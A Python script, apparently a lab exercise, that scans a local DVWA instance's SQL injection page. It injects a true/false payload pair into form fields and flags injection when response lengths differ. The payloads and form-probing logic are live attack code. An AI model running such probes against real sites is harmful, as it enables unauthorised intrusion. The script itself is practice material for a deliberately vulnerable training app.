import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# =========================
# CONFIG
# =========================

TARGET = "http://127.0.0.1/dvwa/vulnerabilities/sqli/"
PHPSESSID = "PASTE_YOUR_PHPSESSID_HERE"
SECURITY = "low"

SQLI_PAYLOADS = {
    "true": "1' OR '1'='1",
    "false": "1' AND '1'='2"
}

REPORT_FILE = "dvwa_sqli_report.txt"

# =========================
# SESSION SETUP
# =========================

session = requests.Session()
session.cookies.set("PHPSESSID", PHPSESSID)
session.cookies.set("security", SECURITY)

vulnerable = []

# =========================
# SQLi SCANNER
# =========================

def scan_sqli(url):
    print(f"\n[*] Scanning: {url}")

    r = session.get(url)
    soup = BeautifulSoup(r.text, "html.parser")

    forms = soup.find_all("form")
    if not forms:
        print("[-] No forms found")
        return

    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()

        target_url = urljoin(url, action)
        inputs = form.find_all("input")

        base_data = {}
        for inp in inputs:
            name = inp.get("name")
            if name:
                base_data[name] = "1"

        # TRUE condition
        data_true = base_data.copy()
        data_true[list(base_data.keys())[0]] = SQLI_PAYLOADS["true"]

        # FALSE condition
        data_false = base_data.copy()
        data_false[list(base_data.keys())[0]] = SQLI_PAYLOADS["false"]

        if method == "post":
            resp_true = session.post(target_url, data=data_true)
            resp_false = session.post(target_url, data=data_false)
        else:
            resp_true = session.get(target_url, params=data_true)
            resp_false = session.get(target_url, params=data_false)

        # Compare response lengths
        if len(resp_true.text) != len(resp_false.text):
            print("[!!! SQL INJECTION FOUND !!!]")
            print("URL:", target_url)
            print("Parameter:", list(base_data.keys())[0])
            print("Payload:", SQLI_PAYLOADS["true"])

            vulnerable.append((target_url, list(base_data.keys())[0], SQLI_PAYLOADS["true"]))

# =========================
# SAVE REPORT
# =========================

def save_report():
    if not vulnerable:
        print("\n[-] No SQL Injection found")
        return

    with open(REPORT_FILE, "w") as f:
        for url, param, payload in vulnerable:
            f.write(f"URL: {url}\nParameter: {param}\nPayload: {payload}\n\n")

    print(f"\n[+] Report saved to {REPORT_FILE}")

# =========================
# MAIN
# =========================

if __name__ == "__main__":
    print("[+] DVWA SQL Injection Scanner Started")
    scan_sqli(TARGET)
    save_report()


